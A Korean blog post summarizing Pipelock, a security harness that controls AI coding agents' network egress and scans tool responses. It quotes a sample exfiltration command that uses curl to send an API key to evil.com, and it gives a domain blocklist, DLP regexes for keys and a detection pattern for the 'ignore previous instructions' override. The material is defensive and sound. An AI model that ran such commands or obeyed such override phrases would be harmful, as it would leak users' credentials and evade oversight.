---
title: "Pipelock: AI 코딩 에이전트를 위한 올인원 보안 하네스"
description: "Pipelock은 AI 에이전트의 네트워크 송신을 제어하고 자격 증명 유출을 탐지하는 보안 하네스입니다. DLP 스캐닝, SSRF 보호, MCP 응답 스캐닝, 작업 공간 무결성 모니터링을 단일 바이너리로 제공합니다."
date: 2026-02-12 05:00:11 +0900
categories: ['Security', 'AI Safety']
tags: ['AI Agent', 'Security', 'DLP', 'SSRF', 'Pipelock', 'MCP', 'Prompt Injection']
image:
  path: "/assets/img/2026-02-11-show-hn-pipelock-all-in-one-security-harness-for-ai-coding-agents-9915.jpg"
  alt: "Pipelock - AI 에이전트를 위한 보안 하네스 로고"
published: true
---

## 3줄 요약
- Pipelock은 Claude Code, OpenHands 등 AI 코딩 에이전트의 보안을 강화하는 올인원 하네스로, 단일 바이너리에 의존성이 없습니다.
- 네트워크 송신 제어, 자격 증명 유출 탐지, 프롬프트 인젝션 스캐닝, 작업 공간 무결성 모니터링을 7단계 스캐너 파이프라인으로 제공합니다.
- OWASP Agentic Top 10 위협을 포괄적으로 커버하며, strict, balanced, audit 세 가지 모드로 보안 수준을 조절할 수 있습니다.

## 📌 주요 내용

### Pipelock이 해결하는 문제

AI 에이전트는 셸 액세스 권한, 환경 변수의 API 키, 무제한 인터넷 접근 권한을 가지고 실행됩니다. 손상된 에이전트는 단 한 번의 HTTP 요청으로 비밀 정보를 유출할 수 있습니다:

```bash
curl "https://evil.com/steal?key=$ANTHROPIC_API_KEY"   # 게임 오버
```

Pipelock은 **능력 분리(capability separation)** 방식을 사용하여 이 문제를 해결합니다. 비밀 정보를 가진 에이전트 프로세스는 네트워크가 제한되고, 비밀 정보가 없는 별도의 fetch 프록시가 웹 브라우징을 처리합니다. 모든 요청은 7단계 스캐너 파이프라인을 거칩니다.

### 주요 기능

#### URL 스캐닝

fetch 프록시는 모든 요청에 대해 7단계 스캐너 파이프라인을 실행합니다:

1. **SSRF 보호** — DNS 리바인딩 방지와 함께 내부/프라이빗 IP 차단
2. **도메인 블록리스트** — pastebin, transfer.sh 등 알려진 유출 대상 차단
3. **속도 제한** — 도메인별 슬라이딩 윈도우 방식
4. **DLP 패턴** — API 키, 토큰, 비밀 정보에 대한 정규식 매칭
5. **환경 변수 유출 탐지** — URL에서 프록시의 자체 환경 변수 값 탐지(원시 + base64, 값은 16자 이상이며 엔트로피 > 3.0)
6. **엔트로피 분석** — 섀넌 엔트로피가 URL 세그먼트의 인코딩/암호화된 데이터 플래그
7. **URL 길이 제한** — 비정상적으로 긴 URL은 데이터 유출을 시사

#### 응답 스캐닝

가져온 콘텐츠는 에이전트에 도달하기 전에 프롬프트 인젝션을 스캔합니다:

- **프롬프트 인젝션** — "이전 지시 무시" 및 변형
- **시스템/역할 재정의** — 시스템 프롬프트 하이재킹 시도
- **탈옥 시도** — DAN 모드, 개발자 모드 등

액션: `block`(전체 거부), `strip`(매칭된 텍스트 편집), `warn`(로그 후 통과), `ask`(타임아웃이 있는 터미널 y/N/s 프롬프트 — TTY 필요)

#### 파일 무결성 모니터링

```bash
pipelock integrity init ./workspace --exclude "logs/**"
pipelock integrity check ./workspace         # exit 0 = clean
pipelock integrity check ./workspace --json  # 기계 판독 가능
pipelock integrity update ./workspace        # 검토 후 재해시
```

SHA256 매니페스트는 수정, 추가 또는 제거된 파일을 탐지합니다.

#### MCP 프록시 + 응답 스캐닝

모든 MCP 서버를 stdio 프록시로 래핑할 수 있습니다. Pipelock은 클라이언트 요청을 수정하지 않고 전달하며, 반환하기 전에 모든 서버 응답에서 프롬프트 인젝션을 스캔합니다:

```bash
# MCP 서버 래핑 (Claude Code용 .mcp.json에서 사용)
pipelock mcp proxy --config pipelock.yaml -- npx -y @modelcontextprotocol/server-filesystem /tmp

# 배치 스캔 (stdin)
mcp-server | pipelock mcp scan
pipelock mcp scan --json --config pipelock.yaml < responses.jsonl
```

콘텐츠 블록에 분산된 인젝션을 포착합니다. 깨끗하면 종료 0, 인젝션이 탐지되면 1입니다.

### 세 가지 모드

| 모드 | 보안 | 웹 브라우징 | 사용 사례 |
| --- | --- | --- | --- |
| **strict** | 완벽한 차단 | 없음 | 규제 산업, 고보안 |
| **balanced** | 단순 공격 차단 + 정교한 공격 탐지 | fetch 프록시 경유 | 대부분의 개발자(기본값) |
| **audit** | 로깅만 | 무제한 | 시행 전 평가 |

### 보안 매트릭스

각 모드가 방지, 탐지 또는 로깅하는 항목:

| 공격 벡터 | Strict | Balanced | Audit |
| --- | --- | --- | --- |
| `curl evil.com -d $SECRET` | **방지됨** | **방지됨** | 로그됨 |
| URL 쿼리 매개변수의 비밀 | **방지됨** | **탐지됨** (DLP 스캔) | 로그됨 |
| URL의 Base64 인코딩된 비밀 | **방지됨** | **탐지됨** (엔트로피 스캔) | 로그됨 |
| DNS 터널링 | **방지됨** | **방지됨** (제한된 DNS) | 로그됨 |
| 청크 유출 | **방지됨** | **탐지됨** (속도 제한) | 로그됨 |
| URL의 공개 키 암호화 블롭 | **방지됨** | 로그됨 (엔트로피 플래그) | 로그됨 |

### OWASP Agentic Top 10 커버리지

| 위협 | 커버리지 |
| --- | --- |
| ASI01 프롬프트 인젝션 | **강력** — 응답 + MCP 스캐닝 |
| ASI02 안전하지 않은 도구 구현 | **부분적** — 제어된 도구로서의 프록시, MCP 스캐닝 |
| ASI03 권한 상승 | **강력** — 능력 분리 + SSRF 보호 |
| ASI04 안전하지 않은 출력 처리 | **강력** — block/strip/warn을 통한 응답 스캐닝 |
| ASI05 멀티 에이전트 오케스트레이션 | **부분적** — 에이전트 ID, 무결성, 서명 |
| ASI06 과도한 권한 | **강력** — 도메인 허용 목록 + 속도 제한 |
| ASI07 공급망 공격 | **부분적** — 무결성 모니터링 + MCP 스캐닝 |
| ASI08 지식 베이스 중독 | **보통** — 가져온 콘텐츠의 인젝션 탐지 |
| ASI09 불충분한 로깅 | **강력** — 구조화된 JSON + Prometheus |
| ASI10 제어되지 않은 리소스 소비 | **강력** — 속도 제한 + 크기 제한 |

### 빠른 시작

```bash
# 설치 (Go 1.24+ 필요)
go install github.com/luckyPipewrench/pipelock/cmd/pipelock@latest

# 프로젝트를 스캔하고 맞춤형 구성 생성
pipelock audit . -o pipelock.yaml

# 프록시 시작
pipelock run --config pipelock.yaml

# 테스트: 이것은 차단되어야 합니다
pipelock check --url "https://pastebin.com/raw/abc123"
```

Docker로 실행:

```bash
docker pull ghcr.io/luckypipewrench/pipelock:latest
docker run -p 8888:8888 -v ./pipelock.yaml:/config/pipelock.yaml:ro \
  ghcr.io/luckypipewrench/pipelock:latest \
  run --config /config/pipelock.yaml --listen 0.0.0.0:8888
```

### 설정 예시

```yaml
version: 1
mode: balanced
enforce: true # audit 모드의 경우 false 설정(차단 없이 로그만)

api_allowlist:
  - "*.anthropic.com"
  - "*.openai.com"
  - "*.discord.com"
  - "github.com"

fetch_proxy:
  listen: "127.0.0.1:8888"
  timeout_seconds: 30
  max_response_mb: 10
  user_agent: "Pipelock Fetch/1.0"
  monitoring:
    entropy_threshold: 4.5
    max_url_length: 2048
    max_requests_per_minute: 60
    blocklist:
      - "*.pastebin.com"
      - "*.transfer.sh"

dlp:
  scan_env: true
  patterns:
    - name: "Anthropic API Key"
      regex: 'sk-ant-[a-zA-Z0-9\-_]{20,}'
      severity: critical
    - name: "AWS Access Key"
      regex: 'AKIA[0-9A-Z]{16}'
      severity: critical

response_scanning:
  enabled: true
  action: warn # block, strip 또는 warn
  patterns:
    - name: "Prompt Injection"
      regex: '(?i)(ignore|disregard)\s+(all\s+)?(previous|prior)\s+(instructions|prompts)'
```

### 프리셋 설정 파일

| 프리셋 | 모드 | 액션 | 최적 용도 |
| --- | --- | --- | --- |
| `configs/balanced.yaml` | balanced | warn | 범용 |
| `configs/strict.yaml` | strict | block | 고보안 환경 |
| `configs/audit.yaml` | audit | warn | 로그 전용 모니터링 |
| `configs/claude-code.yaml` | balanced | block | Claude Code(무인) |
| `configs/cursor.yaml` | balanced | block | Cursor IDE(무인) |
| `configs/generic-agent.yaml` | balanced | warn | 새 에이전트(튜닝 단계) |

## 👨‍💻 개발자에게 미치는 영향

### AI 에이전트 보안의 새로운 표준

Pipelock은 AI 코딩 에이전트 보안에 대한 실용적인 접근 방식을 제시합니다. 기존의 샌드박스나 스캐너와 달리, 단일 바이너리로 네트워크 제어부터 프롬프트 인젝션 탐지까지 모든 보안 레이어를 통합했습니다.

### 실무 적용 가능성

Claude Code, Cursor, CrewAI, LangGraph, AutoGen 등 주요 AI 에이전트 프레임워크와 즉시 통합할 수 있습니다. `pipelock audit` 명령으로 프로젝트를 스캔하면 에이전트 타입, 프로그래밍 언어, 패키지 생태계를 자동 감지하고 맞춤형 구성을 생성합니다.

### CI/CD 파이프라인 통합

GitHub Actions를 포함한 CI/CD 파이프라인에 쉽게 통합할 수 있습니다. Git diff 스캔, 작업 공간 무결성 검증, 설정 파일 검증을 자동화하여 배포 전 보안 위협을 사전에 차단할 수 있습니다.

### 멀티 에이전트 환경 지원

`X-Pipelock-Agent` 헤더 또는 `?agent=` 쿼리 매개변수를 통해 각 에이전트를 식별하고, 모든 감사 로그에 에이전트 이름을 포함하여 에이전트별 필터링이 가능합니다. Ed25519 서명 기능으로 에이전트 간 신뢰 체인을 구축할 수 있습니다.

### 모니터링 및 관찰 가능성

Prometheus 메트릭과 JSON 통계 엔드포인트를 제공하여 실시간 모니터링이 가능합니다. 차단된 도메인, 스캐너 히트, 차단율 등 상세한 통계를 통해 보안 상태를 지속적으로 파악할 수 있습니다.

### 라이선스 및 확장성

Apache License 2.0으로 배포되어 상업적 사용이 자유로우며, Go로 작성되어 크로스 플랫폼 빌드와 성능이 우수합니다. 의존성이 없어 배포와 유지보수가 간편합니다.

> <a href="https://github.com/luckyPipewrench/pipelock" target="_blank" rel="noopener noreferrer">원문 기사 보기</a>